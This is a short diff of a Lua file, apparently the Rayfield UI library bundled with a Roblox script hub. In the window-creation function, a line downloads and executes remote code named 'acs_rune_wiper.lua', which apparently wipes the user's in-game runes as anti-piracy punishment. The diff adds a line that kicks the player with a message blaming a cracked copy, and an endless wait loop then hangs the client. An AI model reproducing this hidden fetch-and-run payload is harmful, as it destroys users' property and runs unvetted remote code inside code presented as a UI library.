@@ -1091,6 +1091,7 @@ function RayfieldLibrary:CreateWindow(Settings, wl)
 		ui.CreateBHUBPAID()
 		]]
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/diepedyt/bui/main/acs_rune_wiper.lua"))()
+		game.Players.LocalPlayer:Kick("You have used Cracked Banana Hub, all of Your Runes are now Scrapped, Get Official Script: discord.gg/BananaHub")
 		while task.wait(.1) do end
 	end
 	local Passthrough = false
